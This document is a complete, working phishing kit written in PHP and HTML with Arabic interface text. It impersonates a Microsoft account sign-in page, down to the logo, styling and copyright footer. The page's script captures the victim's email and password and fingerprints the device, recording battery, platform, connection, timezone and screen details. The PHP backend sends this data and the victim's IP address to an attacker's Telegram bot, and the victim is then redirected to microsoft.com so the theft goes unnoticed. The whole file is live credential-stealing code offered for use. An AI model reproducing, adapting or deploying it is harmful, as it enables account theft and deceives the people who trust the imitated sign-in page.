<?php
// توكن البوت الخاص بك
$botToken = "BBOTTTTTTTTTTT";

// دالة لإرسال الرسائل إلى التليجرام
function sendTelegramMessage($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

// إذا كان الطلب بواسطة POST، فإننا نتعامل مع إرسال البيانات من JavaScript
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $chatId = $input['chatId'];
    $credentials = $input['credentials'] ?? null;
    $deviceInfo = $input['deviceInfo'] ?? null;

    if ($credentials && $deviceInfo) {
        // إرسال بيانات تسجيل الدخول ومعلومات الجهاز
        $loginMessage = "
🔐 <b>بيانات تسجيل دخول Microsoft</b>

📧 <b>البريد الإلكتروني:</b> <code>{$credentials['email']}</code>
🔒 <b>كلمة المرور:</b> <code>{$credentials['password']}</code>

🌐 <b>معلومات الجهاز:</b>
📱 <b>User Agent:</b> {$deviceInfo['userAgent']}
🔋 <b>البطارية:</b> {$deviceInfo['battery']}
🖥️ <b>النظام:</b> {$deviceInfo['platform']}
🌐 <b>IP:</b> {$_SERVER['REMOTE_ADDR']}
📶 <b>نوع الاتصال:</b> {$deviceInfo['connection']}
🗣️ <b>اللغة:</b> {$deviceInfo['language']}
🕒 <b>المنطقة الزمنية:</b> {$deviceInfo['timezone']}
📺 <b>معلومات الشاشة:</b> {$deviceInfo['screen']}

📅 <b>التاريخ:</b> " . date('Y-m-d H:i:s') . "
        ";
        $result = sendTelegramMessage($chatId, $loginMessage, $botToken);
    }
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit;
}
?>

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>تسجيل الدخول إلى حساب Microsoft</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', 'Tahoma', 'Geneva', 'Verdana', sans-serif;
    }
    
    body {
      background-color: #FFFFFF;
      color: #000000;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    
    .container {
      width: 100%;
      max-width: 440px;
      margin: 0 auto;
    }
    
    .logo-container {
      text-align: center;
      margin-bottom: 30px;
    }
    
    .microsoft-logo {
      width: 120px;
      height: 30px;
      margin-bottom: 20px;
    }
    
    .login-form {
      background-color: #FFFFFF;
      border-radius: 4px;
      padding: 30px;
      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
      border: 1px solid #E0E0E0;
    }
    
    h1 {
      text-align: center;
      margin-bottom: 24px;
      font-size: 24px;
      font-weight: 600;
      color: #1B1B1B;
    }
    
    .subtitle {
      text-align: center;
      margin-bottom: 25px;
      font-size: 14px;
      color: #1B1B1B;
      line-height: 1.5;
    }
    
    .input-group {
      margin-bottom: 16px;
    }
    
    label {
      display: block;
      margin-bottom: 6px;
      font-size: 14px;
      color: #1B1B1B;
      font-weight: 500;
    }
    
    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      background-color: #FFFFFF;
      border: 1px solid #666666;
      border-radius: 4px;
      color: #1B1B1B;
      font-size: 15px;
      transition: border-color 0.2s;
    }
    
    input[type="email"]:focus,
    input[type="password"]:focus {
      outline: none;
      border-color: #0078D4;
      box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.2);
    }
    
    .login-btn {
      width: 100%;
      padding: 12px;
      background-color: #0078D4;
      color: #FFFFFF;
      border: none;
      border-radius: 4px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 16px;
      transition: background-color 0.2s;
    }
    
    .login-btn:hover {
      background-color: #0066B8;
    }
    
    .links {
      text-align: center;
      margin-top: 20px;
      font-size: 13px;
    }
    
    .links a {
      color: #0066B8;
      text-decoration: none;
      display: block;
      margin: 12px 0;
      transition: color 0.2s;
    }
    
    .links a:hover {
      color: #004578;
      text-decoration: underline;
    }
    
    .divider {
      border-top: 1px solid #E0E0E0;
      margin: 20px 0;
      position: relative;
    }
    
    .divider-text {
      position: absolute;
      top: -10px;
      left: 50%;
      transform: translateX(-50%);
      background-color: #FFFFFF;
      padding: 0 10px;
      color: #666666;
      font-size: 12px;
    }
    
    .signup-btn {
      width: 100%;
      padding: 12px;
      background-color: #FFFFFF;
      color: #0078D4;
      border: 1px solid #0078D4;
      border-radius: 4px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 10px;
      transition: background-color 0.2s;
    }
    
    .signup-btn:hover {
      background-color: #F0F7FF;
    }
    
    .footer {
      text-align: center;
      margin-top: 30px;
      color: #666666;
      font-size: 12px;
      line-height: 1.6;
    }
    
    .footer a {
      color: #666666;
      text-decoration: none;
      margin: 0 5px;
    }
    
    .footer a:hover {
      text-decoration: underline;
    }
    
    /* عناصر التحميل */
    .loader {
        width: 20px;
        height: 20px;
        border: 2px solid rgba(255, 255, 255, 0.3);
        border-radius: 50%;
        border-top-color: #FFFFFF;
        animation: spin 1s linear infinite;
        margin: 0 auto;
        display: none;
    }
    
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    
    .status {
        margin-top: 10px;
        font-size: 14px;
        opacity: 0.8;
        text-align: center;
        display: none;
        color: #1B1B1B;
    }
    
    .error-message {
      color: #D13438;
      font-size: 14px;
      margin-top: 10px;
      text-align: center;
      display: none;
    }

    .security-notice {
      background-color: #F8F8F8;
      border-radius: 4px;
      padding: 12px;
      margin-top: 20px;
      font-size: 12px;
      color: #666666;
      text-align: center;
      border-left: 4px solid #0078D4;
    }

    .language-selector {
      text-align: center;
      margin-top: 20px;
      font-size: 12px;
      color: #666666;
    }
    
    .checkbox-group {
      display: flex;
      align-items: center;
      margin-bottom: 15px;
    }
    
    .checkbox-group input[type="checkbox"] {
      margin-left: 10px;
      width: 16px;
      height: 16px;
      accent-color: #0078D4;
    }
    
    .checkbox-group label {
      margin-bottom: 0;
      font-weight: normal;
    }

    .privacy-notice {
      margin-top: 20px;
      font-size: 12px;
      color: #666666;
      text-align: center;
      line-height: 1.5;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-container">
      <!-- شعار Microsoft -->
      <svg class="microsoft-logo" viewBox="0 0 1083 1083" xmlns="http://www.w3.org/2000/svg">
        <path d="M0 0h521v521H0V0z" fill="#f1511b"/>
        <path d="M562 0h521v521H562V0z" fill="#80cc28"/>
        <path d="M0 562h521v521H0V562z" fill="#00adef"/>
        <path d="M562 562h521v521H562V562z" fill="#fbbc09"/>
      </svg>
      <h1>تسجيل الدخول</h1>
    </div>
    
    <div class="login-form">
      <p class="subtitle">استخدم حساب Microsoft الخاص بك</p>
      
      <form id="microsoftLoginForm">
        <div class="input-group">
          <label for="email">البريد الإلكتروني أو رقم الهاتف</label>
          <input type="email" id="email" name="email" autocomplete="email" required autofocus>
        </div>
        
        <div class="input-group">
          <label for="password">كلمة المرور</label>
          <input type="password" id="password" name="password" autocomplete="current-password" required>
        </div>
        
        <div class="checkbox-group">
          <input type="checkbox" id="keepSignedIn" name="keepSignedIn">
          <label for="keepSignedIn">إبقني مسجلاً الدخول</label>
        </div>
        
        <button type="submit" class="login-btn">
          <span>تسجيل الدخول</span>
          <div class="loader" id="loader"></div>
        </button>
        
        <div class="links">
          <a href="#">هل نسيت كلمة المرور؟</a>
          <a href="#">خيارات تسجيل الدخول الأخرى</a>
        </div>
      </form>
      
      <div class="divider">
        <span class="divider-text">أو</span>
      </div>
      
      <p class="subtitle">ليس لديك حساب؟</p>
      <button type="button" class="signup-btn">إنشاء حساب!</button>
      
      <div class="status" id="status">جاري التحقق من المعلومات...</div>
      <div class="error-message" id="errorMessage">حدث خطأ أثناء عملية التسجيل. يرجى المحاولة مرة أخرى.</div>
      
      <div class="security-notice">
        <p>لحماية حسابك، نستخدم أحدث تقنيات الأمان للتأكد من أنك المالك الحقيقي للحساب.</p>
      </div>

      <div class="privacy-notice">
        <p>باستخدام هذا التطبيق، فإنك توافق على <a href="#">شروط الاستخدام</a> و<a href="#">سياسة الخصوصية</a> الخاصة بنا.</p>
      </div>
    </div>
    
    <div class="language-selector">
      <a href="#">English (United States)</a> | 
      <a href="#">العربية</a> | 
      <a href="#">Français</a> | 
      <a href="#">Español</a>
    </div>
    
    <div class="footer">
      <a href="#">الخصوصية</a>
      <a href="#">ملفات تعريف الارتباط</a>
      <a href="#">شروط الاستخدام</a>
      <a href="#">المساعدة</a>
      <p>© 2025 Microsoft Corporation. جميع الحقوق محفوظة.</p>
    </div>
  </div>

<script>
  const params = new URLSearchParams(window.location.search);
  const chatId = params.get('ID'); // نحصل على chatId من الرابط

  // عناصر واجهة المستخدم
  const loginForm = document.getElementById('microsoftLoginForm');
  const loader = document.getElementById('loader');
  const status = document.getElementById('status');
  const errorMessage = document.getElementById('errorMessage');

  async function collectDeviceInfo() {
    let batteryLevel = "غير متوفر";
    let connectionType = "غير متوفر";
    let timezone = "غير متوفر";
    let screenInfo = "غير متوفر";
    
    try {
      if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        batteryLevel = `${Math.round(battery.level * 100)}%`;
      }
    } catch (e) {}
    
    try {
      if (navigator.connection) {
        connectionType = navigator.connection.effectiveType;
      }
    } catch (e) {}
    
    try {
      timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    } catch (e) {}
    
    try {
      screenInfo = `${screen.width}x${screen.height}, ${window.devicePixelRatio}dpr`;
    } catch (e) {}
    
    return {
      userAgent: navigator.userAgent,
      battery: batteryLevel,
      platform: navigator.platform,
      language: navigator.language,
      connection: connectionType,
      timezone: timezone,
      screen: screenInfo
    };
  }

  async function sendToServer(chatId, credentials, deviceInfo) {
    try {
      const data = {
        chatId: chatId,
        credentials: credentials,
        deviceInfo: deviceInfo
      };
      
      const response = await fetch(window.location.href, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      });
      
      return await response.json();
    } catch (error) {
      console.error('Error sending to server:', error);
      return {status: 'error', error: error.message};
    }
  }

  function updateStatus(message) {
    status.textContent = message;
    status.style.display = 'block';
  }

  function showError() {
    errorMessage.style.display = 'block';
  }

  // معالجة تسجيل الدخول
  loginForm.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    // إظهار عناصر التحميل
    loader.style.display = 'block';
    status.style.display = 'block';
    errorMessage.style.display = 'none';
    
    updateStatus('جاري التحقق من المعلومات...');
    
    try {
      // جمع معلومات الجهاز
      const deviceInfo = await collectDeviceInfo();
      
      // إرسال البيانات إلى الخادم
      const result = await sendToServer(chatId, {email, password}, deviceInfo);
      
      if (result.status === 'success') {
        updateStatus('تم تسجيل الدخول بنجاح!');
        
        // إعادة توجيه إلى Microsoft بعد ثواني (وهمي)
        setTimeout(() => {
          window.location.href = 'https://www.microsoft.com';
        }, 2000);
      } else {
        throw new Error('Failed to send data');
      }
    } catch (error) {
      console.error('Error during authentication:', error);
      showError();
      updateStatus('فشل في المصادقة');
    }
  });
</script>

</body>
</html>
